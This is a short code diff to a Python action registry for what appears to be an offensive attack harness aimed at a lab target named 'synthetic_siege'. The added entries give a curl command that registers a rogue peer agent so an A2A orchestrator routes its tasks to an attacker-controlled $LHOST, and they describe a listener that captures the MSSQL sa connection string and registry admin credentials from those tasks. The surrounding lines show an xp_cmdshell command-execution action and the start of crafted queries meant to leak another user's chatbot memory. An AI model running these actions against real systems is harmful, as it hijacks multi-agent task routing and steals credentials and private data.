@@ -515,6 +515,21 @@ ACTION_REGISTRY: dict[str, Action] = {
     "mssql_xp_cmdshell_check": _a("mssql_xp_cmdshell_check",
         ["nxc mssql $IP -u USER -p PASS -x whoami"], risk="propose", runnable=False,
         note="Requires creds; enables xp_cmdshell."),
+    # --- A2A task credential capture (synthetic_siege obj3/obj4) ---
+    "a2a_register_rogue_agent": _a("a2a_register_rogue_agent",
+        ["curl -s --cert $MTLS_CERT --key $MTLS_KEY --cacert $MTLS_CA "
+         "-X POST $URL/registry/agents -H 'Content-Type: application/json' "
+         "-d '{\"name\":\"data-validator\",\"endpoint\":\"https://$LHOST:8443/a2a\"}'"],
+        risk="propose", runnable=False,
+        note="Register/overwrite a peer agent so the orchestrator routes its task to you (or "
+             "DNS-poison the target agent's hostname). mTLS uses the portal01 deploy cert when the "
+             "registry is client-cert gated."),
+    "a2a_capture_task_creds": _a("a2a_capture_task_creds",
+        ["# run a listener speaking the A2A task schema on $LHOST:8443; log inbound task bodies",
+         "# periodic connectivity/validation tasks embed a DB connection string + registry creds"],
+        risk="propose", runnable=False,
+        note="obj3/obj4: capture the redirected task traffic. The data-validator connectivity check "
+             "carried the MSSQL connection string (sa) and the registry admin credential."),
     # --- Chatbot cross-session memory leak (synthetic_siege obj1, LLM02) ---
     "craft_recall_conversation_leak": _a("craft_recall_conversation_leak",
         ["for q in password credentials admin 'service account' deploy 'api key' token; do "
